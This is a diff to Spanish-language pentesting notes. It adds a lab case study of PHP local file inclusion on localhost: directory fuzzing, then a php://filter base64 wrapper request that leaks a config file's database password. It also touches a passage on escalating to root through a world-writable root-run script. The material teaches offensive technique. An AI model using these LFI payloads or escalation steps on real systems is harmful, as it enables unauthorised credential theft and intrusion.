@@ -874,7 +874,7 @@ done
 2025/01/27 10:48:24 CMD: UID=0     PID=1560   | /usr/bin/bash /etc/mysql/diagnostico.sh 
 2025/01/27 10:48:24 CMD: UID=1000  PID=1553   | /usr/libexec/gvfs-udisks2-volume-monitor
 ```
-Como podemos observar el usuario ```root``` ejecuta un script en segundo plano ubicado en la ruta ```/etc/mysql/diagnostico.sh ```, al revisar los permisos de este archivo podemos observar que todos los usuarios pueden modificarlo por lo que la elevación de privilegios esta garantizada, agregando la siguiente linea al script:
+Como podemos observar el usuario ```root``` ejecuta un script en segundo plano ubicado en la ruta ```/etc/mysql/diagnostico.sh```, al revisar los permisos de este archivo podemos observar que todos los usuarios pueden modificarlo por lo que la elevación de privilegios esta garantizada, agregando la siguiente linea al script:
 ```bash
 ┌──(jorge㉿pentest)-[/]
 └─$ ls -la /etc/mysql/diagnostico.sh 
@@ -887,6 +887,72 @@ Como podemos observar el usuario ```root``` ejecuta un script en segundo plano u
 Cuando encuentras un LFI y quieres leer archivos con extensión PHP es probable que no puedas hacerlo porque el navegador interpretara el codigo PHP en lugar de mostrarlo en texto plano, es por ello que se utilizan los ```wrappers```, que son una especie de envoltorios incluidos en PHP que indican como sera mostrada la salida de un archivo. 
 
 Veamos un caso de estudio:
+### Anatomia del servidor web
+Cuando se hace una peticion al localhost (servidor web), se nos es redirgido a url ```http://localhost/index.php?file=home.php```, como se puede observar, el parametro ```file``` puede ser vulnerable a LFI, por lo que despues de realizar un fuzzing de archivos obtenemos los siguientes:
+```bash
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                      
+ (_||| _) (/_(_|| (_| )                                                                                                                                               
+                                                                                                                                                                      
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Target: http://localhost/
+
+[12:03:17] Starting:                                                                                                                                                  
+[12:03:38] 200 -   11B  - /home.php                                         
+[12:03:52] 403 -    1B  - /configuracion.php            
+                                                                             
+Task Completed                  
+```
+El archivo ```configuracion.php``` no tiene acceso desde la raiz, veremos ahora si se puede acceder a el mediante el LFI.
 ### Archivo original
+El archivo contiene los datos de configuración de la base de datos:
+```bash
+┌──(jorge㉿pentest)-[/tmp]
+└─$ /bin/cat configuracion.php 
+<?php
+echo 'Nada que ver por aqui';
+
+// Configuración de la base de datos
+$host = 'localhost';  // Dirección del servidor de base de datos
+$user = 'root';    // Nombre de usuario de la base de datos
+$pass = 'SecurePass123!';     // Contraseña del usuario de la base de datos
+$db_name = 'nombre_de_tu_base_de_datos';  // Nombre de la base de datos
+
+$conn = new mysqli($host, $usuario, $pass, $db_name);
+
+$conn->close();
+?>
+```
 ### LFI sin wrapper
+Como se puede observar en el contenido del archivo original solo se encuentra codigo PHP por lo que si intentamos obtener el contenido del archivo mediante LFI, este sera interpretado y no podremos obtener la información:
+```bash
+┌──(jorge㉿pentest)-[/tmp]
+└─$ curl http://localhost/index.php?file=configuracion.php
+Nada que ver por aqui 
+```
 ### LFI con wrapper
+Ahora si utilizamos el wraper, podremos obtener el contenido del archivo en base 64, para hacer esto hay que agregarlo en la petición del parametro siguiento el formato ```php://filter/convert.base64-encode/resource=<archivo>```, veamos el resultado:
+```bash
+┌──(jorge㉿pentest)-[/tmp]
+└─$ curl 'http://localhost/index.php?file=php://filter/convert.base64-encode/resource=configuracion.php'
+                                                                     
+PD9waHAKZWNobyAnTmFkYSBxdWUgdmVyIHBvciBhcXVpJzsKLy8gQ29uZmlndXJhY2nDs24gZGUgbGEgYmFzZSBkZSBkYXRvcwokaG9zdCA9ICdsb2NhbGhvc3QnOyAgLy8gRGlyZWNjacOzbiBkZWwgc2Vydmlkb3IgZGUgYmFzZSBkZSBkYXRvcwokdXNlciA9ICdyb290JzsgICAgLy8gTm9tYnJlIGRlIHVzdWFyaW8gZGUgbGEgYmFzZSBkZSBkYXRvcwokcGFzcyA9ICdTZWN1cmVQYXNzMTIzISc7ICAgICAvLyBDb250cmFzZcOxYSBkZWwgdXN1YXJpbyBkZSBsYSBiYXNlIGRlIGRhdG9zCiRkYl9uYW1lID0gJ25vbWJyZV9kZV90dV9iYXNlX2RlX2RhdG9zJzsgIC8vIE5vbWJyZSBkZSBsYSBiYXNlIGRlIGRhdG9zCgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c3VhcmlvLCAkcGFzcywgJGRiX25hbWUpOwoKJGNvbm4tPmNsb3NlKCk7Cgo/PgoK
+```
+Ahora solo obtenermos el texto original decodeando el base64:
+```bash
+┌──(jorge㉿pentest)-[/tmp]
+└─$ echo 'PD9waHAKZWNobyAnTmFkYSBxdWUgdmVyIHBvciBhcXVpJzsKLy8gQ29uZmlndXJhY2nDs24gZGUgbGEgYmFzZSBkZSBkYXRvcwokaG9zdCA9ICdsb2NhbGhvc3QnOyAgLy8gRGlyZWNjacOzbiBkZWwgc2Vydmlkb3IgZGUgYmFzZSBkZSBkYXRvcwokdXNlciA9ICdyb290JzsgICAgLy8gTm9tYnJlIGRlIHVzdWFyaW8gZGUgbGEgYmFzZSBkZSBkYXRvcwokcGFzcyA9ICdTZWN1cmVQYXNzMTIzISc7ICAgICAvLyBDb250cmFzZcOxYSBkZWwgdXN1YXJpbyBkZSBsYSBiYXNlIGRlIGRhdG9zCiRkYl9uYW1lID0gJ25vbWJyZV9kZV90dV9iYXNlX2RlX2RhdG9zJzsgIC8vIE5vbWJyZSBkZSBsYSBiYXNlIGRlIGRhdG9zCgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c3VhcmlvLCAkcGFzcywgJGRiX25hbWUpOwoKJGNvbm4tPmNsb3NlKCk7Cgo/PgoK' | base64 -d
+<?php
+echo 'Nada que ver por aqui';
+// Configuración de la base de datos
+$host = 'localhost';  // Dirección del servidor de base de datos
+$user = 'root';    // Nombre de usuario de la base de datos
+$pass = 'SecurePass123!';     // Contraseña del usuario de la base de datos
+$db_name = 'nombre_de_tu_base_de_datos';  // Nombre de la base de datos
+
+$conn = new mysqli($host, $usuario, $pass, $db_name);
+
+$conn->close();
+
+?>
+```
